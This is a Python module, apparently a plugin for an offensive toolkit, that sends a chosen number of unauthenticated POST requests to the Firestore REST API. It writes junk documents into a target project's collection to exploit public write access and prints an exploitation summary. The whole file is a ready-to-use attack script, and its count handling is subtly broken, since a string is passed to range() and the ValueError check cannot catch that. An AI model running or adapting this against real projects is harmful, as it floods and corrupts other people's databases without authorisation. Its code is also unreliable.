import requests
import json
import time

from app.utility.colors import C

REQUIRED_OPTIONS = {
    "ID": "",
    "PATH": "",
    "MESSAGE": "( who am i )",
    "COUNT": "( ex: 1000 )",
}


def execute(options):
    """
    Performing a POST Data Injection attack directly to the Firestore API
    to test Public Write Access on a specific collection.
    """
    print(f"{C.MENU}--- FIRESTORE API WRITE EXPLOIT ---")

    project_id = options.get("ID")
    collection_name = options.get("PATH")
    message = options.get("MESSAGE")
    try:
        count = options.get("COUNT")
    except ValueError:
        print(f"{C.ERROR} Must be a number!")
        return

    # URL Firestore REST API
    base_url = "https://firestore.googleapis.com/v1/projects"
    url = f"{base_url}/{project_id}/databases/(default)/documents/{collection_name}"

    print(f"{C.MENU}\n[!] URL: {url}")
    print(f"{C.MENU}[!] Send {count} Document.\n")

    success_count = 0
    fail_count = 0
    delay = 0.5

    current_time = int(time.time())
    for i in range(count):
        current_time = int(time.time())
        payload_data = {
            "fields": {
                "author": {"stringValue": "Anonymous"},
                "message": {"stringValue": f"{message} (#{i+1})"},
                "timestamp": {"integerValue": current_time},
                "status": {"stringValue": "SUCCESS"},
            }
        }

        try:
            response = requests.post(
                url,
                headers={"Content-Type": "application/json"},
                data=json.dumps(payload_data),
                timeout=10,
            )

            # Response Analysis
            if response.status_code == 200:
                print(
                    f"{C.SUCCESS} [{i+1}/{count}] ✅ Success!	|	Status: {response.status_code}	|	ID: {response.json().get('name')}"
                )
                success_count += 1
            else:
                print(
                    f"{C.ERROR} [{i+1}/{count}] ❌ Access denied.	|	Status: {response.status_code}"
                )
                fail_count += 1

            if i < count - 1:
                time.sleep(delay)

        except requests.exceptions.RequestException as e:
            print(f"{C.ERROR}\n❌ CONNECTION ERROR on sending to-{i+1}/{count}")
            fail_count += 1
            print(f"{C.ERROR}ERROR: {e}")

    print(f"\n{C.MENU} --- EXPLOITATION SUMMARY ---")
    print(f"{C.SUCCESS} Total Success: {success_count}")
    print(f"{C.ERROR} Total Fail: {fail_count}")
